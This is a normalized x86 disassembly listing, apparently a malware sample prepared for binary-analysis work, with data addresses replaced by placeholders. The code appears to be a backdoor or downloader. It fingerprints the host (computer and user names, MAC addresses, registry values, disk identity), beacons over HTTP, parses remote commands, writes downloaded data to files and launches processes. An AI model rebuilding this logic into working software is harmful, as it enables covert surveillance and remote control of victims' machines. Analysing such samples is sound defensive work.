sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_4038a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x420
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] esp
push 0x1
mov [ ebp - 0x4 ] ebx
call _sleep
add esp 0x4
call sub_402400
cmp eax ebx
je r-xdata
call sub_402400
cmp eax ebx
je r-xdata
mov esi [ Sleep@IAT ]
mov [ rw-data ] ebx
push 0x1
push rw-data
call [ InitializeSecurityDescriptor@IAT ]
push ebx
push ebx
push 0x1
push rw-data
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] rw-data
jmp r-xdata
push 0x64
call esi
push ebx
call esi
jmp r-xdata
push ebx
push ebx
lea eax [ ebp - 0x2c ]
push ebx
push eax
call [ GetMessageA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
call esi
cmp eax 0x5
je r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] 0xc
push ecx
push rw-data
push rw-data
mov [ rw-data ] 0x1
call sprintf
push ebx
call _sleep
add esp 0x10
push 0x104
push rw-data
push ebx
call [ GetModuleFileNameA@IAT ]
push rw-data
push rw-data
push rw-data
call sprintf
push 0x5c
push rw-data
call strrchr
mov esi eax
lea edx [ esi + 0x1 ]
push edx
push rw-data
push rw-data
call sprintf
add esp 0x20
mov [ esi ] 0x0
push rw-data
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0xb7
je r-xdata
push 0x1
call _sleep
add esp 0x4
push ebx
push ebx
push ebx
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
cmp eax ebx
je r-xdata
push 0x3e8
call _sleep
push rw-data
mov [ rw-data ] ebx
call sub_4026d0
add esp 0x8
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
add esp 0x10
push rw-data
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebx + ebx * 4 ]
lea edi [ eax * 2 + rw-data ]
push edi
call sub_4026d0
add esp 0x4
mov esi rw-data
mov eax edi
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4026d0
add esp 0x14
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
cmp eax 0x1
je r-xdata
push rw-data
push rw-data
call fopen
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
cmp eax 0x8
jne r-xdata
xor edi edi
mov eax ebx
shl eax 0x6
add eax rw-data
push eax
call sub_4026d0
add esp 0x4
inc ebx
jmp r-xdata
mov [ rw-data ] ebx
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push rw-data
call sub_4026d0
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_4027b0
add esp 0x14
call sub_401550
push 0x0
call exit
push esi
mov [ ebp + edi - 0x42c ] 0x0
call fclose
lea ecx [ ebp - 0x42c ]
push ecx
call sub_4026d0
mov edx [ rw-data ]
add esp 0x8
xor edi edi
mov eax [ esi + 0x4 ]
dec eax
mov [ esi + 0x4 ] eax
js r-xdata
cmp ebx [ rw-data ]
jge r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
lea eax [ edi + edi * 4 ]
lea esi [ eax * 2 + rw-data ]
lea eax [ ebp - 0x42c ]
push esi
call _filbuf
add esp 0x4
mov ecx [ esi ]
xor eax eax
mov al [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp eax 0x20
jl r-xdata
cmp eax 0xffffffff
je r-xdata
cmp edi edx
jl r-xdata
inc edi
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x7e
jg r-xdata
mov [ rw-data ] edi
cmp edi edx
jge r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov [ ebp + edi - 0x42c ] al
inc edi
jmp r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
cmp edi 0x3ff
jge r-xdata
sub_401550
sub esp 0xcc
mov eax [ rw-data ]
mov cx [ rw-data ]
mov dl [ rw-data ]
push ebx
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
mov [ esp + 0x34 ] cx
mov cl [ rw-data ]
mov [ esp + 0x36 ] dl
mov edx [ rw-data ]
push ebp
push esi
push edi
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
mov [ esp + 0x1c ] cl
mov ecx [ rw-data ]
mov [ esp + 0x4c ] edx
mov dl [ rw-data ]
xor edi edi
push rw-data
mov [ esp + 0x18 ] edi
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] ecx
mov [ esp + 0x5c ] dl
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call sub_4026d0
push rw-data
call atoi
push rw-data
mov esi eax
call atoi
push rw-data
mov [ esp + 0x64 ] eax
call atoi
push rw-data
mov [ esp + 0x78 ] eax
call atoi
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x6c ]
push eax
call sub_4026d0
lea ecx [ esp + 0x4c ]
push ecx
call sub_4026d0
lea edx [ esp + 0x84 ]
push edx
call sub_4026d0
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call _sleep
mov ecx [ rw-data ]
add esp 0x40
mov [ esp + 0x30 ] edi
mov [ esp + 0x10 ] ecx
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xcc
retn
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
cmp edx eax
jl r-xdata
mov eax [ esp + 0x10 ]
push rw-data
lea eax [ eax + eax * 4 ]
lea eax [ eax * 2 + rw-data ]
mov [ esp + 0x28 ] eax
push eax
lea eax [ esp + 0x64 ]
push rw-data
push eax
call sprintf
lea edi [ esp + 0x6c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x6c ]
push ebp
push ecx
call sub_402690
lea edx [ esp + 0x74 ]
push ebp
push edx
call sub_4034d0
mov ecx [ esp + 0x54 ]
mov [ esp + 0x40 ] eax
mov eax 0x1
add esp 0x20
cmp ecx eax
mov [ esp + 0x28 ] eax
jl r-xdata
mov [ esp + 0x10 ] edi
mov eax [ esp + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
push 0x64
call _sleep
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x14 ]
add esp 0x4
inc eax
inc edx
cmp eax 0xa
mov [ esp + 0x30 ] eax
mov [ esp + 0x10 ] edx
jl r-xdata
push eax
call free
add esp 0x4
call sub_401ce0
mov ecx [ rw-data ]
lea eax [ esp + 0x3c ]
push eax
push ecx
call strstr
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call strstr
add esp 0x8
test eax eax
je r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x18 ]
push edx
push eax
call strstr
add esp 0x8
test eax eax
je r-xdata
push 0x0
call exit
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
push esi
push edx
call sub_402690
mov eax [ rw-data ]
push esi
push eax
call sub_4034d0
mov [ rw-data ] eax
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x20 ]
push ecx
push rw-data
push edx
push rw-data
push rw-data
push rw-data
call sprintf
mov eax [ rw-data ]
add esp 0x18
test eax eax
je r-xdata
push eax
call free
add esp 0x4
mov eax [ esp + 0x10 ]
push 0x1
shl eax 0x6
add eax rw-data
push 0x50
push eax
push 0x0
push rw-data
call sub_402430
mov ebx eax
mov eax [ rw-data ]
add esp 0x14
cmp eax 0x6
mov [ esp + 0x2c ] ebx
jl r-xdata
push eax
call free
add esp 0x4
mov eax [ esp + 0x38 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
push edx
call _sleep
test ebx ebx
je r-xdata
jmp r-xdata
push rw-data
push ebx
call strstr
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esp + 0x38 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x3
push ecx
call _sleep
add esp 0x4
push ebx
call free
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x2
[ edi ]
not ecx
dec ecx
push rw-data
add esi ecx
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x38 ]
add esp 0x4
inc eax
cmp eax ecx
mov [ esp + 0x28 ] eax
jle r-xdata
push ebx
call free
add esp 0x4
push 0x2
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x2
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push rw-data
push rw-data
mov [ esp + 0x1c ] 0x1
call fopen
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
push ebx
call free
jmp r-xdata
push rw-data
push rw-data
mov [ esp + 0x1c ] 0x1
call fopen
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x5c ]
push ecx
push rw-data
push edx
call sprintf
lea eax [ esp + 0x68 ]
push eax
call sub_4026d0
mov edx [ rw-data ]
lea ecx [ esp + 0x6c ]
push ecx
push rw-data
push edx
call fprintf
mov eax [ rw-data ]
push eax
call fclose
add esp 0x20
push ebx
call free
jmp r-xdata
lea ecx [ esi + 0x2 ]
push rw-data
push ecx
call strtok
push eax
call _strdup
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x5c ]
push ecx
push rw-data
push edx
call sprintf
lea eax [ esp + 0x68 ]
push eax
call sub_4026d0
mov edx [ rw-data ]
lea ecx [ esp + 0x6c ]
push ecx
push rw-data
push edx
call fprintf
mov eax [ rw-data ]
push eax
call fclose
add esp 0x20
lea esi [ esi + ebp + 0x2 ]
test esi esi
je r-xdata
push ebx
call atoi
mov [ esp + 0x48 ] eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ebx
mov ebp ecx
inc ebp
call free
add esp 0x8
mov ebx [ esp + 0x2c ]
mov edi [ esp + 0x44 ]
push edi
push esi
call sub_402690
push rw-data
push rw-data
call fopen
add esp 0x10
mov [ rw-data ] eax
test eax eax
je r-xdata
push rw-data
call sub_402370
mov eax [ esp + 0x4c ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call _sleep
push rw-data
call sub_4027b0
add esp 0xc
push eax
push edi
push 0x1
push esi
call fwrite
mov edx [ rw-data ]
push edx
call fclose
add esp 0x14
sub_401ad0
sub esp 0x238
push ebx
push ebp
push esi
mov esi [ CreateFileA@IAT ]
xor ebx ebx
push edi
mov edi [ DeviceIoControl@IAT ]
mov [ esp + 0x10 ] bl
mov [ esp + 0x11 ] 0x2
mov [ esp + 0x12 ] bl
mov [ esp + 0x13 ] bl
mov [ esp + 0x14 ] bl
mov [ esp + 0x15 ] bl
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] 0xec
mov [ esp + 0x1b ] bl
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] bl
mov [ esp + 0x1e ] bl
mov [ esp + 0x1f ] bl
mov [ esp + 0x20 ] bl
mov [ esp + 0x21 ] bl
mov [ esp + 0x22 ] bl
mov [ esp + 0x23 ] bl
mov [ esp + 0x24 ] bl
mov [ esp + 0x25 ] bl
mov [ esp + 0x26 ] bl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] bl
mov [ esp + 0x29 ] bl
mov [ esp + 0x2a ] bl
mov [ esp + 0x2b ] bl
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] bl
mov [ esp + 0x2e ] bl
mov [ esp + 0x2f ] bl
xor ebp ebp
inc ebp
cmp ebp 0xa
jl r-xdata
lea ecx [ esp + 0x34 ]
push ebx
push ecx
lea edx [ esp + 0x40 ]
push 0x210
push edx
lea ecx [ esp + 0x20 ]
push 0x20
push ecx
push 0x7c088
push eax
call edi
test eax eax
jne r-xdata
push ebx
push ebx
push 0x3
push ebx
push 0x3
push 0xc0000000
push rw-data
call esi
cmp eax 0xffffffff
mov [ esp + 0x30 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x238
retn
mov edx [ esp + 0x24c ]
lea edi [ esp + 0x5c ]
xor esi esi
mov eax edx
sub edi edx
mov edx [ esp + 0x30 ]
push edx
call [ CloseHandle@IAT ]
mov [ eax ] 0x2e
cmp cl 0x7e
ja r-xdata
cmp ecx 0x1
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
mov [ eax ] cl
jmp r-xdata
inc esi
inc eax
cmp esi 0x4a
jl r-xdata
mov bl [ eax ]
mov cl [ esi + edx - 0x1 ]
mov [ eax - 0x1 ] bl
mov [ eax ] cl
xor ebx ebx
mov ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ edi + eax ]
cmp cl 0x20
jb r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
mov [ edx + 0x4a ] bl
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + edx ] 0x20
jne r-xdata
cmp [ esi + edx ] 0x20
jne r-xdata
mov [ ecx + edx + 0x1 ] bl
mov edi edx
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
not ecx
dec ecx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp esi ebx
jle r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
inc esi
[ edi ]
not ecx
dec ecx
cmp esi ecx
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x238
retn
mov al [ esi + edx ]
cmp al 0x61
jl r-xdata
mov al [ ecx + edx - 0x1 ]
dec ecx
cmp al 0x20
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp esi ecx
jae r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
inc esi
[ edi ]
not ecx
dec ecx
cmp esi ecx
jb r-xdata
cmp al 0x7a
jg r-xdata
mov ebp edx
sub al 0x20
mov [ esi + edx ] al
mov al [ esi + edx ]
inc esi
mov [ ebp ] al
mov edi edx
or ecx 0xffffffff
xor eax eax
inc ebp
[ edi ]
not ecx
dec ecx
cmp esi ecx
jb r-xdata
sub_401ce0
mov eax 0x1804
call sub_4036b0
push rw-data
call sub_401ad0
add esp 0x4
cmp eax 0x1
je r-xdata
mov al [ rw-data ]
push esi
test al al
push edi
je r-xdata
call sub_402250
push ebx
push ebp
mov ebp [ RegOpenKeyExA@IAT ]
push rw-data
push 0x20019
push 0x0
push rw-data
push 0x80000002
call ebp
mov esi [ RegQueryValueExA@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push rw-data
call sub_402970
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_4029c0
push rw-data
push rw-data
call sub_402ab0
add esp 0x18
xor esi esi
mov edi rw-data
mov eax [ rw-data ]
mov ebx [ RegCloseKey@IAT ]
push eax
call ebx
push rw-data
push 0x20019
push 0x0
push rw-data
push 0x80000002
call ebp
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x14 ]
mov edx [ rw-data ]
[ edi ]
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
push rw-data
push eax
push rw-data
push edx
mov [ rw-data ] 0x400
call esi
test eax eax
je r-xdata
xor eax eax
mov al [ esi + rw-data ]
push eax
push rw-data
push 0x20
push edi
call _snprintf
add esp 0x10
inc esi
add edi 0x2
cmp esi 0x10
jl r-xdata
mov [ rw-data ] 0x0
push rw-data
mov ecx 0x100
lea edi [ esp + 0x14 ]
mov edx [ rw-data ]
push rw-data
[ edi ]
lea ecx [ esp + 0x18 ]
mov [ rw-data ] 0x400
push ecx
push rw-data
push eax
push rw-data
push edx
call esi
test eax eax
jne r-xdata
mov al [ esp + 0x14 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x14 ]
push rw-data
push eax
push rw-data
push 0x0
push rw-data
push ecx
call esi
test eax eax
je r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
jmp r-xdata
mov al [ ecx ]
test al al
je r-xdata
cmp al 0x20
je r-xdata
xor al al
mov [ esp + 0x14 ] al
jmp r-xdata
mov eax [ rw-data ]
push eax
call ebx
mov esi 0x7f
push rw-data
push rw-data
mov [ rw-data ] esi
call [ GetComputerNameA@IAT ]
push rw-data
push rw-data
mov [ rw-data ] esi
call [ GetUserNameA@IAT ]
push 0x280
call malloc
add esp 0x4
lea ecx [ esp + 0x10 ]
mov esi eax
mov [ esp + 0x10 ] 0x280
push ecx
push esi
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
mov ecx [ rw-data ]
lea edi [ esp + 0x14 ]
mov edx ecx
push rw-data
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push 0x0
mov ebp 0x400
push rw-data
push eax
mov [ rw-data ] ebp
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
push 0x80000002
call ebp
test eax eax
mov [ rw-data ] eax
jne r-xdata
call _strdup
mov ecx [ rw-data ]
add esp 0x4
mov [ rw-data ] eax
push ecx
call ebx
call sub_402400
push rw-data
push 0x20019
test eax eax
push 0x0
je r-xdata
mov [ edx ] 0x0
lea edx [ esp + 0x14 ]
push edx
call _strdup
add esp 0x4
mov [ rw-data ] eax
mov [ edx ] al
mov al [ ecx + 0x1 ]
inc edx
inc ecx
test al al
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
cmp al 0x9
jne r-xdata
test al al
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x14 ]
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call GetAdaptersInfo
test eax eax
jne r-xdata
push esi
call free
mov edx [ esp + 0x14 ]
push edx
call malloc
add esp 0x8
mov esi eax
mov ecx [ rw-data ]
xor eax eax
mov edx ecx
lea edi [ esp + 0x14 ]
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push rw-data
push 0x0
push rw-data
push eax
mov [ rw-data ] ebp
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] 0x0
lea ecx [ esp + 0x414 ]
push rw-data
push ecx
call sprintf
add esp 0x8
test esi esi
mov [ esp + 0x414 ] al
mov edx esi
je r-xdata
call sub_402400
test eax eax
je r-xdata
xor esi esi
push rw-data
push rw-data
call fopen
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx 0x400
xor eax eax
lea edi [ esp + 0x814 ]
push rw-data
[ edi ]
call [ PathFileExistsA@IAT ]
pop ebp
pop ebx
test eax eax
je r-xdata
lea edi [ edx + 0x1b0 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x414 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebx [ esp + 0x414 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov ecx [ rw-data ]
xor eax eax
mov edx ecx
lea edi [ esp + 0x14 ]
shr ecx 0x2
[ edi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push rw-data
push 0x0
push rw-data
push eax
mov [ rw-data ] 0x400
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov esi [ esp + 0x8 ]
lea edx [ esp + 0x80c ]
push edx
push rw-data
push edi
call fscanf
lea eax [ esp + 0x818 ]
push eax
call atoi
push edi
mov esi eax
call fclose
add esp 0x14
jmp r-xdata
jmp r-xdata
mov ecx 0x400
xor eax eax
lea edi [ esp + 0x814 ]
push rw-data
[ edi ]
push rw-data
lea ecx [ esp + 0x81c ]
push 0x1000
push ecx
call _snprintf
lea edi [ esp + 0x824 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x824 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push rw-data
call strncpy
add esp 0x1c
mov esi 0x3e7
jmp r-xdata
cmp esi 0x3e8
jle r-xdata
cmp esi 0x1
jl r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x40c ]
push rw-data
push ecx
push esi
push rw-data
push rw-data
push edx
push eax
push rw-data
push rw-data
lea ecx [ esp + 0x830 ]
push rw-data
push ecx
call sprintf
lea edx [ esp + 0x838 ]
push edx
call _strdup
add esp 0x30
mov [ rw-data ] eax
xor eax eax
pop edi
pop esi
add esp 0x1804
retn
sub_402250
mov eax 0x14020
call sub_4036b0
push edi
push rw-data
push rw-data
xor edi edi
call sprintf
add esp 0x8
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x10 ] 0x14000
push eax
push ecx
call GetAdaptersInfo
xor edx edx
mov [ esp + 0x4 ] edx
test eax eax
mov [ esp + 0x8 ] dx
jne r-xdata
pop edi
add esp 0x14020
retn
push esi
lea esi [ esp + 0x28 ]
mov cl [ esi + eax + 0x194 ]
mov dl [ esp + eax + 0x8 ]
xor dl cl
mov [ esp + eax + 0x8 ] dl
inc eax
cmp eax 0x6
jl r-xdata
mov esi [ esi ]
inc edi
test esi esi
je r-xdata
mov edx [ esp + 0xd ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xb ]
and edx 0xff
and eax 0xff
push edx
mov edx [ esp + 0xe ]
and ecx 0xff
push eax
mov eax [ esp + 0x11 ]
push ecx
mov ecx [ esp + 0x14 ]
and edx 0xff
and eax 0xff
push edx
and ecx 0xff
push eax
push ecx
push rw-data
push rw-data
call sprintf
add esp 0x20
pop esi
cmp edi 0xa
jl r-xdata
xor eax eax
xor ecx ecx
mov al [ esi + 0x199 ]
mov cl [ esi + 0x198 ]
xor edx edx
push eax
mov dl [ esi + 0x197 ]
push ecx
xor eax eax
push edx
mov al [ esi + 0x196 ]
xor ecx ecx
mov cl [ esi + 0x195 ]
xor edx edx
mov dl [ esi + 0x194 ]
push eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push rw-data
push eax
call sprintf
add esp 0x20
xor eax eax
sub_402370
sub esp 0x6c
push esi
push edi
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
[ edi ] [ esi ]
push eax
call sub_4026d0
add esp 0x4
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edx eax
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x30 ]
[ edi ]
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x7c ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov [ esp + 0x58 ] 0x44
mov [ esp + 0x84 ] 0x81
mov [ esp + 0x88 ] 0x5
call edx
dec eax
pop edi
neg eax
sbb eax eax
pop esi
add esp 0x6c
retn
sub_402430
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov ecx 0xc
mov esi rw-data
lea edi [ esp + 0x20 ]
lea eax [ esp + 0x20 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push eax
mov [ esp + 0x1c ] 0x4
movsb [ edi ] [ esi ]
call sub_4026d0
add esp 0x4
lea ecx [ esp + 0x20 ]
push 0x0
push 0x0
push 0x0
push 0x4
push ecx
call [ InternetOpenA@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x10 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn
mov edx [ esp + 0x64 ]
mov eax [ esp + 0x60 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push edx
push eax
push ebx
call [ InternetConnectA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov eax [ esp + 0x68 ]
dec eax
je r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn
mov edx [ esp + 0x58 ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push edx
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
dec eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn
mov esi [ esp + 0x58 ]
mov ecx [ esp + 0x58 ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push ecx
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ esp + 0x14 ]
cmp eax 0x197
je r-xdata
push 0x3e8
call _sleep
add esp 0x4
test esi esi
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
add esp 0x4
mov edi eax
xor ebx ebx
mov edx [ esp + 0x5c ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
push eax
push eax
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x0
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push ebp
call esi
push ebx
call esi
mov ecx [ esp + 0x14 ]
mov [ rw-data ] ecx
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ rw-data ] 0x0
call esi
push ebp
call esi
mov edx [ esp + 0x10 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x44
retn
push edi
call free
add esp 0x4
push esi
